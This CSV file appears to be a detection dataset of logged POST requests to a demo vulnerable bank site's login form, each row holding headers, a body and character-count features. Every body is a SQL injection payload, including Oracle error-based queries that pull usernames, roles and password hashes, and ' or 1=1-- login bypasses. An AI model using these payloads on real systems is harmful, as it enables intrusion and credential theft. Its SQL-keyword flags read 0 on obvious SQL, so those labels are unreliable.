method,path,headers,body,body_length,num_commas,num_hyphens,num_brackets,num_quotes,num_double_quotes,num_slashes,num_braces,num_spaces,has_sql_keywords,has_xss_payload,has_csrf_token
POST,http://demo.testfire.net/doLogin,"{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/login.jsp', 'Content-Type': 'application/x-www-form-urlencoded', 'content-length': '201', 'Origin': 'https://demo.testfire.net', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=3DF0A6829EC62974747D3B861C41D305', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}","' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=6)) AND 'i'='i",166,1,0,10,4,0,0,0,15,0,0,0
POST,http://demo.testfire.net/doLogin,"{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/login.jsp', 'Content-Type': 'application/x-www-form-urlencoded', 'content-length': '230', 'Origin': 'https://demo.testfire.net', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=3DF0A6829EC62974747D3B861C41D305', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}","' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=6)) AND 'i'='i",195,1,0,10,4,0,0,0,17,0,0,0
POST,http://demo.testfire.net/doLogin,"{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/login.jsp', 'Content-Type': 'application/x-www-form-urlencoded', 'content-length': '193', 'Origin': 'https://demo.testfire.net', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=3DF0A6829EC62974747D3B861C41D305', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}","' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=7)) AND 'i'='i",158,1,0,10,4,0,0,0,15,0,0,0
POST,http://demo.testfire.net/doLogin,"{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/login.jsp', 'Content-Type': 'application/x-www-form-urlencoded', 'content-length': '189', 'Origin': 'https://demo.testfire.net', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=3DF0A6829EC62974747D3B861C41D305', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}","' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=7)) AND 'i'='i",154,1,0,10,4,0,0,0,15,0,0,0
POST,http://demo.testfire.net/doLogin,"{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/login.jsp', 'Content-Type': 'application/x-www-form-urlencoded', 'content-length': '198', 'Origin': 'https://demo.testfire.net', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=3DF0A6829EC62974747D3B861C41D305', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}","' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=7)) AND 'i'='i",163,1,0,10,4,0,0,0,15,0,0,0
POST,http://demo.testfire.net/doLogin,"{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/login.jsp', 'Content-Type': 'application/x-www-form-urlencoded', 'content-length': '201', 'Origin': 'https://demo.testfire.net', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=3DF0A6829EC62974747D3B861C41D305', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}","' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=7)) AND 'i'='i",166,1,0,10,4,0,0,0,15,0,0,0
POST,http://demo.testfire.net/doLogin,"{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/login.jsp', 'Content-Type': 'application/x-www-form-urlencoded', 'content-length': '230', 'Origin': 'https://demo.testfire.net', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=3DF0A6829EC62974747D3B861C41D305', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}","' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=7)) AND 'i'='i",195,1,0,10,4,0,0,0,17,0,0,0
POST,http://demo.testfire.net/doLogin,"{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/login.jsp', 'Content-Type': 'application/x-www-form-urlencoded', 'content-length': '193', 'Origin': 'https://demo.testfire.net', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=3DF0A6829EC62974747D3B861C41D305', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}","' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=8)) AND 'i'='i",158,1,0,10,4,0,0,0,15,0,0,0
POST,http://demo.testfire.net/doLogin,"{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/login.jsp', 'Content-Type': 'application/x-www-form-urlencoded', 'content-length': '189', 'Origin': 'https://demo.testfire.net', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=3DF0A6829EC62974747D3B861C41D305', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}","' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=8)) AND 'i'='i",154,1,0,10,4,0,0,0,15,0,0,0
POST,http://demo.testfire.net/doLogin,"{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/login.jsp', 'Content-Type': 'application/x-www-form-urlencoded', 'content-length': '198', 'Origin': 'https://demo.testfire.net', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=3DF0A6829EC62974747D3B861C41D305', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}","' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=8)) AND 'i'='i",163,1,0,10,4,0,0,0,15,0,0,0
POST,http://demo.testfire.net/doLogin,"{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/login.jsp', 'Content-Type': 'application/x-www-form-urlencoded', 'content-length': '201', 'Origin': 'https://demo.testfire.net', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=3DF0A6829EC62974747D3B861C41D305', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}","' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=8)) AND 'i'='i",166,1,0,10,4,0,0,0,15,0,0,0
POST,http://demo.testfire.net/doLogin,"{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/login.jsp', 'Content-Type': 'application/x-www-form-urlencoded', 'content-length': '230', 'Origin': 'https://demo.testfire.net', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=3DF0A6829EC62974747D3B861C41D305', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}","' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=8)) AND 'i'='i",195,1,0,10,4,0,0,0,17,0,0,0
POST,http://demo.testfire.net/doLogin,"{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/login.jsp', 'Content-Type': 'application/x-www-form-urlencoded', 'content-length': '79', 'Origin': 'https://demo.testfire.net', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=3DF0A6829EC62974747D3B861C41D305', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}","'||(elt(-3 5,bin(15),ord(10),hex(char(45))))",44,3,1,12,1,0,0,0,1,0,0,0
POST,http://demo.testfire.net/doLogin,"{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/login.jsp', 'Content-Type': 'application/x-www-form-urlencoded', 'content-length': '38', 'Origin': 'https://demo.testfire.net', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=3DF0A6829EC62974747D3B861C41D305', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",||6,3,0,0,0,0,0,0,0,0,0,0,0
POST,http://demo.testfire.net/doLogin,"{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/login.jsp', 'Content-Type': 'application/x-www-form-urlencoded', 'content-length': '40', 'Origin': 'https://demo.testfire.net', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=3DF0A6829EC62974747D3B861C41D305', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",'||'6,5,0,0,0,2,0,0,0,0,0,0,0
POST,http://demo.testfire.net/doLogin,"{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/login.jsp', 'Content-Type': 'application/x-www-form-urlencoded', 'content-length': '40', 'Origin': 'https://demo.testfire.net', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=3DF0A6829EC62974747D3B861C41D305', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",(||6),5,0,0,2,0,0,0,0,0,0,0,0
POST,http://demo.testfire.net/doLogin,"{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/login.jsp', 'Content-Type': 'application/x-www-form-urlencoded', 'content-length': '46', 'Origin': 'https://demo.testfire.net', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=3DF0A6829EC62974747D3B861C41D305', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",' or 1=1-- ,11,0,2,0,1,0,0,0,3,0,0,0
POST,http://demo.testfire.net/doLogin,"{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/login.jsp', 'Content-Type': 'application/x-www-form-urlencoded', 'content-length': '41', 'Origin': 'https://demo.testfire.net', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=3DF0A6829EC62974747D3B861C41D305', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",or 1=1,6,0,0,0,0,0,0,0,1,0,0,0
POST,http://demo.testfire.net/doLogin,"{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/login.jsp', 'Content-Type': 'application/x-www-form-urlencoded', 'content-length': '46', 'Origin': 'https://demo.testfire.net', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=3DF0A6829EC62974747D3B861C41D305', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",' or '1'='1,11,0,0,0,4,0,0,0,2,0,0,0
POST,http://demo.testfire.net/doLogin,"{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/login.jsp', 'Content-Type': 'application/x-www-form-urlencoded', 'content-length': '47', 'Origin': 'https://demo.testfire.net', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=3DF0A6829EC62974747D3B861C41D305', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",; or '1'='1',12,0,0,0,4,0,0,0,2,0,0,0
POST,http://demo.testfire.net/doLogin,"{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/login.jsp', 'Content-Type': 'application/x-www-form-urlencoded', 'content-length': '54', 'Origin': 'https://demo.testfire.net', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=3DF0A6829EC62974747D3B861C41D305', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",""" or isNULL(1/0) /*",19,0,0,2,0,1,2,0,3,0,0,0
POST,http://demo.testfire.net/doLogin,"{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/login.jsp', 'Content-Type': 'application/x-www-form-urlencoded', 'content-length': '52', 'Origin': 'https://demo.testfire.net', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=3DF0A6829EC62974747D3B861C41D305', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",' or '7659'='7659,17,0,0,0,4,0,0,0,2,0,0,0
POST,http://demo.testfire.net/doLogin,"{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/login.jsp', 'Content-Type': 'application/x-www-form-urlencoded', 'content-length': '54', 'Origin': 'https://demo.testfire.net', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=3DF0A6829EC62974747D3B861C41D305', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",""" or isNULL(1/0) /*",19,0,0,2,0,1,2,0,3,0,0,0
POST,http://demo.testfire.net/doLogin,"{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/login.jsp', 'Content-Type': 'application/x-www-form-urlencoded', 'content-length': '40', 'Origin': 'https://demo.testfire.net', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=3DF0A6829EC62974747D3B861C41D305', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",' -- ,5,0,2,0,1,0,0,0,2,0,0,0
POST,http://demo.testfire.net/doLogin,"{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/login.jsp', 'Content-Type': 'application/x-www-form-urlencoded', 'content-length': '45', 'Origin': 'https://demo.testfire.net', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=3DF0A6829EC62974747D3B861C41D305', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",' or 1=1--,10,0,2,0,1,0,0,0,2,0,0,0
POST,http://demo.testfire.net/doLogin,"{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/login.jsp', 'Content-Type': 'application/x-www-form-urlencoded', 'content-length': '45', 'Origin': 'https://demo.testfire.net', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=3DF0A6829EC62974747D3B861C41D305', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",""" or 1=1--",10,0,2,0,0,1,0,0,2,0,0,0
POST,http://demo.testfire.net/doLogin,"{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/login.jsp', 'Content-Type': 'application/x-www-form-urlencoded', 'content-length': '46', 'Origin': 'https://demo.testfire.net', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=3DF0A6829EC62974747D3B861C41D305', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",' or 1=1 /*,11,0,0,0,1,0,1,0,3,0,0,0
POST,http://demo.testfire.net/doLogin,"{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/login.jsp', 'Content-Type': 'application/x-www-form-urlencoded', 'content-length': '43', 'Origin': 'https://demo.testfire.net', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=3DF0A6829EC62974747D3B861C41D305', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",or 1=1--,8,0,2,0,0,0,0,0,1,0,0,0
POST,http://demo.testfire.net/doLogin,"{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/login.jsp', 'Content-Type': 'application/x-www-form-urlencoded', 'content-length': '46', 'Origin': 'https://demo.testfire.net', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=3DF0A6829EC62974747D3B861C41D305', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",' or 'a'='a,11,0,0,0,4,0,0,0,2,0,0,0
